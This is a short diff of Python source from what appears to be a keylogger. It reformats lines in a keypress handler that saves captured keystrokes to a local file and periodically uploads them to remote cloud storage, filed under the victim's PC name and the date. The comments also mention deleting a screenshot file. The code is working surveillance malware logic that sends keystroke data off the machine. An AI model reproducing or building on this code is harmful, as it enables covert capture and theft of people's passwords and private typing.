@@ -46,8 +46,7 @@ def on_press(key):
         if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
             f.close()
 
-            storage.child(pcName +
-                          '/keylogs_' + today_date + '.txt') \
+            storage.child(pcName + '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
 
             # delete screenshot.jpg + data.txt
@@ -56,8 +55,7 @@ def on_press(key):
         elif len(data) % 20 == 0:
             f.close()
 
-            storage.child(pcName +
-                          '/keylogs_' + today_date + '.txt') \
+            storage.child(pcName + '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
             print('!')
             f = open('data.txt', 'a+', encoding='utf-8')
